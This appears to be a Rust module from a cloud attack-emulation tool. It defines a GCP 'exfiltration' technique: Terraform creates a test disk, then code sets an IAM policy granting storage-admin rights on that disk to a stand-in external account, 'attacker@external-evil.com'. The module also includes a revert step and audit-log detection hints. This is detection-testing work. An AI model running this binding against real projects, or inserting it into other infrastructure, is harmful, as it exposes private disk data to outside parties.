use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const TERRAFORM: &str = r#"
terraform {
  required_providers {
    google = { source = "hashicorp/google", version = "~> 4.0" }
    random = { source = "hashicorp/random", version = "~> 3.0" }
  }
}

variable "project_id" {}

provider "google" { project = var.project_id }

resource "random_string" "suffix" {
  length  = 8
  special = false
  upper   = false
}

resource "google_compute_disk" "disk" {
  name  = "stratus-disk-${random_string.suffix.result}"
  type  = "pd-standard"
  zone  = "us-central1-a"
  size  = 10
}

output "disk_name" { value = google_compute_disk.disk.name }
output "zone"      { value = google_compute_disk.disk.zone }
"#;

const ATTACKER_ACCOUNT: &str = "user:attacker@external-evil.com";

async fn gcp_token() -> Result<String> {
    if let Ok(token) = std::env::var("GOOGLE_ACCESS_TOKEN") {
        return Ok(token);
    }
    let output = tokio::process::Command::new("gcloud")
        .args(["auth", "print-access-token"])
        .output()
        .await?;
    let token = String::from_utf8(output.stdout)?.trim().to_string();
    if token.is_empty() {
        anyhow::bail!("Could not obtain GCP access token via gcloud CLI");
    }
    Ok(token)
}

async fn gcp_project() -> Result<String> {
    std::env::var("GOOGLE_PROJECT_ID")
        .map_err(|_| anyhow::anyhow!("GOOGLE_PROJECT_ID not set"))
}

async fn detonate_impl(
    outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let token = gcp_token().await?;
    let project = gcp_project().await?;
    let http = reqwest::Client::new();

    let disk_name = outputs
        .get("disk_name")
        .ok_or_else(|| anyhow::anyhow!("Missing output: disk_name"))?;
    let zone = outputs
        .get("zone")
        .map(|s| s.as_str())
        .unwrap_or("us-central1-a");
    // Extract short zone name from full zone URL if needed
    let zone_short = zone.split('/').last().unwrap_or(zone);

    let url = format!(
        "https://compute.googleapis.com/compute/v1/projects/{}/zones/{}/disks/{}/setIamPolicy",
        project, zone_short, disk_name
    );

    let body = serde_json::json!({
        "policy": {
            "bindings": [{
                "role": "roles/compute.storageAdmin",
                "members": [ATTACKER_ACCOUNT]
            }]
        }
    });

    let resp = http
        .post(&url)
        .bearer_auth(&token)
        .json(&body)
        .send()
        .await?;

    if resp.status().is_success() || resp.status().as_u16() == 200 {
        println!(
            "Set IAM policy on disk '{}' to allow '{}' — attacker can now read/export disk data",
            disk_name, ATTACKER_ACCOUNT
        );
    } else {
        let status = resp.status();
        let text = resp.text().await.unwrap_or_default();
        anyhow::bail!("Failed to set disk IAM policy ({}): {}", status, text);
    }

    Ok(())
}

fn detonate(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(
    outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let token = gcp_token().await?;
    let project = gcp_project().await?;
    let http = reqwest::Client::new();

    let disk_name = outputs
        .get("disk_name")
        .ok_or_else(|| anyhow::anyhow!("Missing output: disk_name"))?;
    let zone = outputs
        .get("zone")
        .map(|s| s.as_str())
        .unwrap_or("us-central1-a");
    let zone_short = zone.split('/').last().unwrap_or(zone);

    let url = format!(
        "https://compute.googleapis.com/compute/v1/projects/{}/zones/{}/disks/{}/setIamPolicy",
        project, zone_short, disk_name
    );

    // Set empty policy to remove all bindings
    let body = serde_json::json!({
        "policy": {
            "bindings": []
        }
    });

    let resp = http
        .post(&url)
        .bearer_auth(&token)
        .json(&body)
        .send()
        .await?;

    if resp.status().is_success() || resp.status().as_u16() == 200 {
        println!("Removed attacker IAM binding from disk '{}'", disk_name);
    } else {
        let status = resp.status();
        let text = resp.text().await.unwrap_or_default();
        anyhow::bail!("Failed to remove disk IAM binding ({}): {}", status, text);
    }

    Ok(())
}

fn revert(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "gcp.exfiltration.share-compute-disk",
        friendly_name: "Share GCP Compute Disk with External Account",
        description: "Sets an IAM policy on a GCP Compute disk granting an external attacker account storage admin access, allowing disk data exfiltration.",
        detection: "GCP Audit Log: compute.disks.setIamPolicy with external member binding. Cloud Security Command Center: Public disk sharing alert.",
        platform: Platform::Gcp,
        mitre_tactics: &[MitreTactic::Exfiltration],
        is_idempotent: true,
        is_slow: false,
        prerequisite_tf: Some(TERRAFORM),
        detonate,
        revert: Some(revert),
    }
}
